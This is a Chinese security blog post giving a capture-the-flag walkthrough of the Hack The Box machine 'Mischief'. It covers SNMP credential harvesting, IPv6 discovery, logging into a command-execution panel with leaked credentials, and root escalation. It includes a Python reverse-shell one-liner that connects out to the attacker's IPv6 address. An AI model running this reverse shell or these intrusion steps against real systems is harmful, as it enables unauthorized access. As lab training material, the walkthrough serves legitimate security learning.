@@ -1,0 +1,149 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/C2jCR1yoQgqh3xHdODy-_g)
+
+一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)
+
+  
+
+  
+
+大家好，这里是 **大余安全** 的第 **131** 篇文章，本公众号会每日分享攻防渗透技术给大家。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/4gCJbFBBaxgr0WD3mMgto4yFaYwwjQMbuxDDBKibrhNlW5YFLV3K1XvkGj1sP1BiaYtibMLdQVrvth08BVUWP7oGw/640?wx_fmt=png)
+
+靶机地址：https://www.hackthebox.eu/home/machines/profile/145
+
+靶机难度：疯狂（5.0/10）
+
+靶机发布日期：2019 年 1 月 3 日
+
+靶机描述：
+
+Mischief is hard to insane difficulty machine that highlights the risks involved with exposing SNMP, and the dangers of passing credentials over the command line. It also features a "ping" admin page - functionality often found on appliances, which is worth testing for RCE vulnerabilities.
+
+请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HpA1SPmFiaXnH0icIic57eR9QytbPrsHiapgSzTxN8oh4ibvYCVK7ETUkaZIRlbfNom9X0QGt93I0RFaaAKA0Sibab3Q/640?wx_fmt=png)
+
+一、信息收集
+
+![](https://mmbiz.qpic.cn/mmbiz_png/mtXBpHBrIJmMvSfMA2IDGnclSl50gYw6Njhvznic1ZW25vGceuDAakscJgPLT6WQmfvzSibQZ3ib5gnGYQYTlclFg/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLmdj32tu0bN0fMG5MMBdmMOZmGJKzTcWsMuruOv1iboOEL5Dibzia0VqDw/640?wx_fmt=png)
+
+可以看到靶机的 IP 是 10.10.10.92..
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLzPz2oH89EQKD6p6kg0hmm8BY7zicuwwsAibJwAcWHYvaJB8VpwzUvCQQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLvicuGmvdKVObYXtCVo3lQkqARhfS1iabnicE7l8Jcx0XmXq0HcltEPL1Q/640?wx_fmt=png)
+
+Nmap 发现开放了 SSH（需要基本身份验证的 Python Web 服务器）和 SNMP...
+
+可以看到本地开放了 3366 和 UDP 有关...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLbDvGibGlfS0cy5pwPwx055nmInLribAfC4ZU9AUricQSA6IjwX4dvicCbw/640?wx_fmt=png)
+
+看到登录凭据被用作连接端口 3366 进行身份验证... 获得登录账号密码....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLO6ycJml65EpYqWZrX2xdyjjSn2LTEmNbC7LTKYGTgb6a1OBs9bN9Qg/640?wx_fmt=png)
+
+直接访问 3366 页面，利用凭证成功登录... 又获得了两组密码...
+
+对于 snmp 以前 HTB 靶机也遇到过，存在 snmp 一般在 ipv6 上也开放了相对应的端口...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLdib1kdMZiaT2AffUPMdKNIHJgc960XyIsB9nBgqTp7WaUh18AJeVffvA/640?wx_fmt=png)
+
+```
+git clone https://github.com/trickster0/Enyx.git
+```
+
+利用 Enyx 脚本获取靶机的 ipv6 信息...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaL2WSTtlkWcuYR4e6tNsz8nqHqdV1t91ofkDPvicTBlPtAAMckL0lhaPw/640?wx_fmt=png)通过 nmap 扫描发现了 ssh 和 80 端口都开放着...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLWMnk0emQQcRhDr9FgVm2fPecEhVEkyzEqFwojFrOkXFBE1qXgg4EuQ/640?wx_fmt=png)
+
+通过 IPv6 成功访问页面....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLsm5yicI8RsLrcyT3WicpKsicD7dHya2YmAJrRMhbicrcBNzYBBfIOwuibQA/640?wx_fmt=png)
+
+这是个登陆页面... 从前面获取的两组密码... 进行尝试...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLymG6QKmhXgoXe2286sibZNRdmzMicn6pFAexfNszDGn9GPLQLk9W5PXA/640?wx_fmt=png)
+
+通过 administrator/trickeryanddeceit 成功进入...
+
+可以看到这是命令执行的面板 REC，可以运行任意系统命令... 利用 python 简单 shell 提权...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLmROicCqxiaYldicn5rK40bTbqxYSBlaTGr9JPVib4wgmVRibdia917vfvqrQ/640?wx_fmt=png)
+
+可以看到，这里使用 IP 无法提权...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLlysC3gfibKdLdpwUIabjqSYAXibic9U2ziawJqk8TbJOXcEFbJIZ8NV5rA/640?wx_fmt=png)
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1031",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+需要 IPV6 进行，获得了反向外壳...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaL3OF2act77octocEbwwzrmibm4QOPrNxLSva8ky8iaNVFIM9wupKZACYg/640?wx_fmt=png)
+
+无法获得 user_flag 信息... 但是在 loki 目录下读取到了 passwd 密码信息...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLiapWVZR090tLlQq8dFG8ibzoE1U65kLU06Vbr9lFurYsyzTEuibqGTnqQ/640?wx_fmt=png)
+
+尝试 ssh 登陆，成功登陆... 获得了 user_flag 信息...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLD596gbl5lqYl4pXlup5I2uqRl2uluyzrX0796fupibOucORpiavrGdoQ/640?wx_fmt=png)
+
+直接枚举目录底层信息... 查看第一个文件就发现了 loki 又一组密码信息...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLCgc023eEcS45H0vXLFRYsE0DyEmfm0FiapQYThy1ZYRkx9matz6ktrA/640?wx_fmt=png)可以看到 loki 用户没有执行切换用户命令的权限...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLsWkNxbiaVrsEaQr4Q6LKjNGGgAUEu43dgwbLb4rUf4LUTJnqkH8IlWQ/640?wx_fmt=png)
+
+回到前面的 www 权限，优化 TTY 后，su 获得了 root 权限... 但是还是无法读取 root_flag...
+
+提示 root_flag 不在此处... 说明 root 没加密流，继续在别的地方找找...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMokqj80Ur053Bb3OFMtTiaLv4iajWE4VY487IEiclXSrWwZl8ibjM3W1klf43qyyOCibxrbYMmn56LG7A/640?wx_fmt=png)
+
+获得了 root_flag 信息...
+
+这台靶机说难，其实感觉很中规中矩... 作者给了 Insane 难度评价.... 疯狂...
+
+可能大多数人会在 TCP 坑里停留很久...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/4gCJbFBBaxgr0WD3mMgto4yFaYwwjQMbuxDDBKibrhNlW5YFLV3K1XvkGj1sP1BiaYtibMLdQVrvth08BVUWP7oGw/640?wx_fmt=png)
+
+针对 HTB 的 5.0 难度靶机，推荐 UDP 也顺带 nmap...
+
+我前面做了两台类似的 snmp_udp 的靶机... 然后利用 ipv6 提权的... 所以可能比较轻松....
+
+获得 www 提权后，如果加点加密流阻碍，在弄个缓冲区溢出提权... 才能对得起 Insane 难度评价把...
+
+给个评价难度高级.... 哈哈哈... 加油
+
+由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台高级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。
+
+如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。
+
+如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~
+
+![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)
+
+随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**
+
+欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！
+
+![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  
+
+大余安全
+
+一个全栈渗透小技巧的公众号
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)
